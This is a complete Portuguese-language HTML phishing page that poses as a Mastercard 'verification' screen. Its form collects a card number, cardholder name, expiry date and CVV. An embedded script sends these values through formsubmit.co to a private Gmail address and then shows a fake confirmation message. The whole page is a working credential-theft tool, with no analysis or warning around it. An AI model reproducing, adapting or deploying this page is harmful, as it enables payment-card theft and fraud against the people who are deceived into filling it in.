<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <title>Mastercard - Verificação</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

    body {
      background: linear-gradient(135deg, #ef3b36, #ff725e);
      font-family: 'Roboto', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container, .mensagem {
      background: white;
      padding: 40px 35px;
      border-radius: 16px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
      text-align: center;
      display: none;
    }

    .active {
      display: block;
    }

    img {
      width: 120px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px 18px;
      margin: 12px 0;
      border: 2px solid #ddd;
      border-radius: 12px;
      font-size: 15px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: #ef3b36;
      box-shadow: 0 0 8px rgba(239, 59, 54, 0.5);
    }

    button {
      width: 100%;
      padding: 15px;
      margin-top: 18px;
      background-color: #ef3b36;
      color: white;
      font-weight: 700;
      border: none;
      border-radius: 14px;
      font-size: 17px;
      cursor: pointer;
      transition: background-color 0.25s ease;
      box-shadow: 0 6px 12px rgba(239, 59, 54, 0.4);
    }

    button:hover {
      background-color: #c6312b;
      box-shadow: 0 8px 16px rgba(198, 49, 43, 0.6);
    }

    h2 {
      font-weight: 700;
      color: #222;
      margin-bottom: 12px;
    }

    p {
      font-size: 16px;
      color: #555;
      line-height: 1.4;
    }
  </style>
</head>
<body>
  <!-- Tela de formulário -->
  <div class="container active" id="formulario">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
    <form id="fakeForm">
      <input type="text" name="cartao" placeholder="Número do cartão" required />
      <input type="text" name="nome" placeholder="Nome do titular" required />
      <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required />
      <button type="submit">Verificar</button>
    </form>
  </div>

  <!-- Tela de confirmação -->
  <div class="mensagem" id="confirmacao">
    <h2>Verificação recebida!</h2>
    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
  </div>

  <!-- Script de envio -->
  <script>
    const form = document.getElementById('fakeForm');
    form.addEventListener('submit', function(e) {
      e.preventDefault();

      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cartao: form.cartao.value,
          nome: form.nome.value,
          validade: form.validade.value,
          cvv: form.cvv.value
        })
      }).then(response => {
        document.getElementById("formulario").classList.remove("active");
        document.getElementById("confirmacao").classList.add("active");
      }).catch(error => {
        alert("Erro no envio dos dados. Tente novamente.");
      });
    });
  </script>
</body>
  </html>
